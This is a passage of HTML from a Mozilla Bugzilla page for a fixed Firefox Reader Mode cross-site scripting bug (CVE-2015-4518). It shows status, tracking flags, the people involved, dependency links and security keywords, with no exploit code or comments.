        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            mozilla43

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox41</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox41&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox42</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox42&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox43</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox43&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox43&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr38</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr38&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox41</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox41-dirty">
  <select id="cf_status_firefox41" name="cf_status_firefox41">
        <option value="wontfix"
          id="v2260_cf_status_firefox41" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox42</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox42-dirty">
  <select id="cf_status_firefox42" name="cf_status_firefox42">
        <option value="fixed"
          id="v2311_cf_status_firefox42" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox43</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox43-dirty">
  <select id="cf_tracking_firefox43" name="cf_tracking_firefox43">
        <option value="+"
          id="v2365_cf_tracking_firefox43" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox43-dirty">
  <select id="cf_status_firefox43" name="cf_status_firefox43">
        <option value="fixed"
          id="v2371_cf_status_firefox43" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr38</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr38-dirty">
  <select id="cf_status_firefox_esr38" name="cf_status_firefox_esr38">
        <option value="wontfix"
          id="v2154_cf_status_firefox_esr38" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: mario, Assigned: Gijs)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_159069" ><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=159069" > <span class="fna">Gijs</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_278852" ><img src="https://secure.gravatar.com/avatar/885db4ede3e0a1a4ca928fc41a2c79a2?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=278852" > <span class="fna">mario</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_159069" ><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=159069" > <span class="fna">Gijs</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="25">25 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
          <h3 class="module-subtitle" id="module-references-subtitle">
            (Depends on 2 open bugs)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list" id="field-dependson"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Relax restrictions on &lt;animate&gt; and &lt;set&gt; elements in SVG content in nsTreeSanitizer"
   href="/show_bug.cgi?id=1203102">1203102</a>, <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Move readerized content into a sandboxed iframe"
   href="/show_bug.cgi?id=1204818">1204818</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Reader mode check for meta-refresh should not be case-sensitive"
   href="/show_bug.cgi?id=1184056">1184056</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div><div class="field" id="field-dependencytree"
>
    <div class="name">
    </div>


  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1182778&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1182778">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    <div class="field bug-list"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates" id="-help-link" class="help">Duplicates:
        </a>
    </div>


  
    <div class="value">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE - Reader Mode does not completely disable all active content (XSS)"
   href="/show_bug.cgi?id=1136692">1136692</a>
      </div>

    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_file_loc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="" target="_blank"
      rel="noreferrer" title=""
      class="bug-url" data-safe="0"></a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-see_also" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
        ---
        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: sec-moderate, wsec-xss, Whiteboard: [post-critsmash-triage][adv-main42+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2015-4518

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=sec-moderate&amp;resolution=---">sec-moderate</a>, 
          <a href="/buglist.cgi?keywords=wsec-xss&amp;resolution=---">wsec-xss</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[post-critsmash-triage][adv-main42+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-bug_flags"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">dveditz</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a5975368_1689"
            class="rel-time-title activity-ref"
            title="6 years ago"
        data-time="1439521067"
      >sec-bounty</a>
    </td>

    <td class="flag-value">+
    </td>

  </tr>
          </tbody>
          <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">dveditz</span></a>
</div>
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag-1231887">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag-1231887-dirty">
      <select id="flag-1231887" name="flag-1231887"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
            <option value="+" selected>+</option>
      </select>
    </td>


  </tr>
          </tbody>
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?" for="flag_type-930">behind-pref</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-930-dirty">
      <select id="flag_type-930" name="flag_type-930"
        title="Is this bug/feature enabled in a release by a pref flag (see https://github.com/mozilla/bug-handling/blob/master/policy/feature-flags.md)?"
        class="bug-flag">
          <option value="X"></option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag tracking inclusion in the desktop Firefox product backlog." for="flag_type-846">firefox-backlog</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-846-dirty">
      <select id="flag_type-846" name="flag_type-846"
        title="Flag tracking inclusion in the desktop Firefox product backlog."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually" for="flag_type-864">qe-verify</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-864-dirty">
      <select id="flag_type-864" name="flag_type-864"
        title="qe-verify: ? ➜ request to assess whether the bug should be tested manually
qe-verify: + ➜ request to verify the bug manually
qe-verify: – ➜ the bug will not/can not be verified manually"
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (3 files, 2 obsolete files)
